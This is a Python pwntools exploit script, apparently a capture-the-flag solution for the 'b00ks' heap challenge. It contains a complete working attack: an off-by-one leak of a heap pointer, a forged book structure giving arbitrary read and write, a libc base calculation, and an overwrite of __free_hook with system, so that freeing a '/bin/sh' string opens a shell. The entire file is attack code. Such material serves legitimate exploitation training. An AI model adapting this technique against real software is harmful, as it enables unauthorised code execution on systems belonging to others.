#!/usr/bin/env python
#-*- coding: utf-8 -*-
from pwn import *

def EnterAuthorName(authorname):
    io.sendlineafter('Enter author name: ', authorname)

def CreateBook(nsize, name, dsize, description):
    io.sendlineafter('> ', str(1))
    io.sendlineafter('Enter book name size: ', str(nsize))
    io.sendlineafter('Enter book name (Max 32 chars): ', name)
    io.sendlineafter('Enter book description size: ', str(dsize))
    io.sendlineafter('Enter book description: ', description)

def DeleteBook(id):
    io.sendlineafter('> ', str(2))
    io.recvuntil('Enter the book id you want to delete: ')
    io.sendline(str(id))

def EditBook(id, description):
    io.sendlineafter('> ', str(3))
    io.sendlineafter('Enter the book id you want to edit: ', str(id))
    io.sendlineafter('Enter new book description: ', description)

def PrintBookDetail():
    io.sendlineafter('> ', str(4))

def ChangeAuthorName(authorname):
    io.sendlineafter('> ', str(5))
    io.sendlineafter('Enter author name: ', authorname)

def LeakBook1Addr():
    EnterAuthorName('a'*32)
    CreateBook(0x80, 'Andyi', 0x80, 'Andyi love you')
    PrintBookDetail()
    io.recvuntil('a'*32)
    book1_addr = u64(io.recvn(6).ljust(8, '\x00'))
    return book1_addr

def exploit():
    book1_addr = LeakBook1Addr()
    log.info('book1_addr: ' + hex(book1_addr))

    CreateBook(0x20, '/bin/sh\x00', 0x21000, 'mmaps')
    book2_addr = book1_addr + 0x60
    log.info('book2_addr: ' + hex(book2_addr))

    payload = 'a'*0x50 + p64(1) + p64(book2_addr+0x10) + p64(book2_addr+0x10) + p64(0x80)
    EditBook(1, payload)

    ChangeAuthorName('a'*32)
    PrintBookDetail()
    io.recvuntil('Name: ')
    book2_des_addr = u64(io.recvn(6).ljust(8, '\x00'))
    log.info('book2_des_addr: ' + hex(book2_des_addr))
    libc_addr = book2_des_addr - 0x5CD010
    log.info('libc_addr: ' + hex(libc_addr))

    free_hook_addr = libc.symbols['__free_hook'] + libc_addr
    EditBook(1, p64(free_hook_addr))
    system_addr = libc.symbols['system'] + libc_addr
    EditBook(2, p64(system_addr))
    DeleteBook(2)

    io.interactive()



if __name__ == "__main__":
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    io = process('./b00ks')
    exploit()

